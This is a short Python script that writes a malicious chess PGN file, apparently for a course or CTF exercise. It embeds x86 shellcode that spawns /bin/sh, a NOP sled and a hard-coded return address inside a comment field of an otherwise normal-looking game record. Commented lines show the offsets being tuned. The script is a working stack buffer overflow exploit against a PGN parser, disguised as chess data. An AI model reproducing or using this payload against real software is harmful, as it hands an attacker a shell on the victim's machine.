shell_code="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# the_as = b'\x90'*973+shell_code+"\x60\xee\xff\xbf"*10
payload = "\x90"*977 + shell_code + "\x48\xee\xff\xbf"*10
# the_as = "\x90"*1036+"\x51\x51\x51\x51"	
# the_as = "\x90"*1040
# print(len(the_as))
with open('mal_file1.pgn', 'w') as the_file:
    the_file.write('[Event "State Ch."]\n')
    the_file.write('[White "Capablanca"]\n')
    the_file.write('[Black "Jaffe"]\n')
    the_file.write('[Result "1-0"]\n')
    the_file.write('[Board "4r3/6P1/2p2P1k/1p6/pP2p1R1/P1B5/2P2K2/3r4"]\n')
    the_file.write('[CommentSTX]\n')
    the_file.write(payload)
    the_file.write('\n[CommentEND]')